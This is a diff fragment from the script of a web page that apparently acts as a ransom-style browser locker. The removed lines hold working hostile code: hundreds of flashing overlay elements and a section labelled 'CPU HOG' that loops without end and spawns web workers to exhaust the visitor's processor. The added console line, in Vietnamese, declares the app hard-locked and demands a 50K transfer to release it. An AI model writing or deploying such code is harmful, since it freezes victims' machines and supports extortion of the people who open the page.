-        for(let i=0;i<300;i++){ const div=document.createElement('div'); div.style.cssText=`position:fixed;top:${Math.random()*100}vh;left:${Math.random()*100}vw;width:${Math.random()*40+5}px;height:${Math.random()*40+5}px;background:hsla(${Math.random()*360},100%,60%,0.04);border-radius:${Math.random()*50}%;pointer-events:none;z-index:0;animation:blinkText 0.03s infinite alternate;`; document.body.appendChild(div); }
-
-        // ===== CPU HOG =====
-        (function cpuHog(){ let a=0; for(let i=0;i<200000;i++){ a+=Math.sin(i)*Math.cos(i)*Math.tan(i)*Math.sqrt(i+1); } setTimeout(cpuHog,0); })();
-        for(let i=0;i<30;i++){ setInterval(function(){ let b=0; for(let j=0;j<20000;j++){ b+=Math.sqrt(j)*Math.log(j+1)*Math.sin(j); } },2); }
-        try { for(let w=0;w<8;w++){ const blob=new Blob([`let x=0; setInterval(function(){ for(let i=0;i<100000;i++){ x+=Math.sin(i)*Math.cos(i); } },1);`],{type:'application/javascript'}); const worker=new Worker(URL.createObjectURL(blob)); } } catch(e){}
-
-        console.log('🔒 APP ĐÃ CHẠY - TỰ ĐỘNG CHO PHÉP QUYỀN');
+        console.log('🔒 APP KHÓA CỨNG - KHÔNG THỂ THOÁT - CHUYỂN 50K MỚI RA');
     })();
 </script>
 </body>
